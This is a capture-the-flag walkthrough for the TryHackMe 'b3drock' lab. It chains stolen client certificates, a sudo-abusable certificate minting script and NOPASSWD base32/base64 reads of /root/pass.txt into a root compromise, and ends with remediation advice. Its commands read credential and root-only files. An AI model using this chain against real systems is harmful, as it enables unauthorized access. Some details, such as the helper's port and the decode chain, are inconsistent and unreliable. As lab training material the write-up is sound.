# TryHackMe — b3drock — Walkthrough

> **Synopsis:** The box demonstrates client-certificate authentication and a poorly restricted certificate helper that can mint client certs. I used a credential helper to obtain Barney’s cert/key, authenticated to a TLS helper to get credentials for Fred, and finally escalated to root using `fred`'s sudo permissions.

---

<img width="2602" height="756" alt="image" src="https://github.com/user-attachments/assets/d47680cc-7c5d-4e51-ab87-9936096415fc" />

---

## Briefing

- nginx on port **80** redirects to a custom TLS webserver on **4040**.
- A TCP helper on **9001** serves TLS credential files (client key & certificate).
- A TLS helper on **54321** accepts client certificates for authenticated requests.
- Goal: obtain user flags (Barney & Fred) and the root flag.

---

## Enumeration & initial access — Barney

1. **Probe services** (example):
```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

2. **Talk to the credential helper (plain TCP, port 9009)**  
   The helper accepts simple text commands (e.g. `help`, `ls`, `get <file>`). Connect with `nc`:

```bash
nc <TARGET_IP> 9001
# try commands: help, ls, get barney.crt, get barney.key
```

3. **Save Barney’s cert & key**  
   When the helper prints PEM blocks, save them locally as `barney.crt` and `barney.key`:

```bash
# Example (paste PEM when prompted)
cat > barney.crt <<'EOF'
-----BEGIN CERTIFICATE-----
...REDACTED...
-----END CERTIFICATE-----
EOF

cat > barney.key <<'EOF'
-----BEGIN RSA PRIVATE KEY-----
...REDACTED...
-----END RSA PRIVATE KEY-----
EOF
chmod 600 barney.key
```

4. **Verify the certificate**:
```bash
openssl x509 -in barney.crt -noout -subject -issuer -dates -serial
```

5. **Authenticate to the TLS helper (port 54321)**  
   Present the client cert & key to the TLS helper (use `socat` or `openssl s_client`):

```bash
# interactive
socat stdio ssl:<TARGET_IP>:54321,cert=./barney.crt,key=./barney.key,verify=0

# or
openssl s_client -connect <TARGET_IP>:54321 -cert barney.crt -key barney.key -quiet
```

6. **Outcome:** after authenticating as Barney the TLS helper returned a password (the hint was the password itself). I used that password to SSH in as **barney** and retrieved the user flag.

---

## Privilege pivot — minting Fred’s certs

1. **Check sudo for barney**:
```bash
sudo -l
# Output:
# User barney may run: (ALL : ALL) /usr/bin/certutil
```

2. **Inspect `/usr/bin/certutil`**  
   The script was a small NodeJS wrapper that `require()`d a module in `/usr/share/abc/dist/certs.js`. That module exposes a generator that:

- accepts two args: `<username>` `<fullname>`
- uses the service signing key to create a certificate and private key
- writes `<user>.clientKey.pem` and `<user>.certificate.pem` to `/usr/share/abc/certs/`
- prints the PEM blobs to stdout

3. **Generate Fred’s cert/key (as barney)**  
   Because `barney` can run `/usr/bin/certutil` as root, I generated Fred’s client credentials:

```bash
sudo /usr/bin/certutil fred "Fred Flintstone" | sed -n '1,240p'
```

This created:

```
/usr/share/abc/certs/fred.clientKey.pem
/usr/share/abc/certs/fred.certificate.pem
```

---

## Authenticate as Fred & extract the encoded blob

1. **Present Fred’s client cert to the TLS helper**  
   Run this on the target (the service listens on `127.0.0.1:54321`) or copy the cert/key to your attacker host and use port forwarding.

```bash
# on the box
socat stdio ssl:127.0.0.1:54321,cert=/usr/share/abc/certs/fred.certificate.pem,key=/usr/share/abc/certs/fred.clientKey.pem,verify=0
```

2. **Capture the returned data**  
   The service returned a long encoded string (Base32/Base32/Base64). Save that exact string (including `=` padding) into `/tmp/enc_blob.txt`.

---

## Decoding the secret & getting root

1. **Decode the chain**  
   On the box (or locally) decode the blob with the following pipeline. The correct chain for this box was: **Base32 → Base32 → Base64**.

```bash
cat /tmp/enc_blob.txt | tr -d '\n' \
  | base32 --decode \
  | base32 --decode \
  | base64 --decode > /tmp/decoded.bin

# view the result (it may be a hex string)
xxd -p /tmp/decoded.bin || cat /tmp/decoded.bin
```

2. **Result**  
   The final decoded value was a short string that served as the **root password** (e.g. `a00a12aad6b7c16bf07032bd05a31d56` — redacted here).

3. **Alternative path (using Fred's sudo rights)**  
   `fred` also had NOPASSWD sudo for `base32` and `base64` on `/root/pass.txt`:

```bash
sudo -l
# User fred may run:
# (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
# (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

   Using these allowed encoders I read the encoded `/root/pass.txt` as root and fed its contents into the same decode chain:

```bash
sudo /usr/bin/base32 /root/pass.txt | base32 -d | base64 -d
# or
sudo /usr/bin/base64 /root/pass.txt | base64 -d
```

This produced the same secret used as the root password.

4. **Become root**  
```bash
su - root
# paste the decoded password when prompted
whoami
cat /root/root.txt
```

---

## Flags (redacted)
- `user.txt` (Barney): `THM{...}`  
- `user.txt` (Fred): `THM{...}`  
- `root.txt`: `THM{...}`

*(Replace the placeholders with your captured flags when you publish privately; do not include keys in public posts.)*

---

## Key takeaways & remediations

- **Principle of least privilege:** Do not give users sudo permissions to programs that can create or sign credentials without strict argument validation and logging.
- **Protect signing keys:** Service signing keys should be offline or tightly access-controlled; helper scripts that sign client certs must require authentication and approval.
- **Avoid allowing encoders (base32/base64) with NOPASSWD on sensitive files:** If a user can run an encoding tool on a root-only file, they effectively can read that file by decoding the output locally.
- **Audit custom helper scripts:** NodeJS wrappers and other convenience scripts should be reviewed before being allowed to run as root.

---

## Commands reference

```bash
# connect to credential helper
nc <TARGET_IP> 9001

# save PEMs you get (example)
cat > barney.crt <<'EOF' ... EOF
cat > barney.key <<'EOF' ... EOF
chmod 600 barney.key

# verify cert
openssl x509 -in barney.crt -noout -subject -issuer -dates -serial

# authenticate to TLS helper
socat stdio ssl:<TARGET_IP>:54321,cert=./barney.crt,key=./barney.key,verify=0

# generate fred certs (barney)
sudo /usr/bin/certutil fred "Fred Flintstone"

# authenticate as fred (on box)
socat stdio ssl:127.0.0.1:54321,cert=/usr/share/abc/certs/fred.certificate.pem,key=/usr/share/abc/certs/fred.clientKey.pem,verify=0

# decode returned blob (Base32 -> Base32 -> Base64)
cat /tmp/enc_blob.txt | tr -d '\n' | base32 -d | base32 -d | base64 -d

# read /root/pass.txt as fred (if allowed)
sudo /usr/bin/base64 /root/pass.txt | base64 -d
sudo /usr/bin/base32 /root/pass.txt | base32 -d

# become root
su - root
```

---
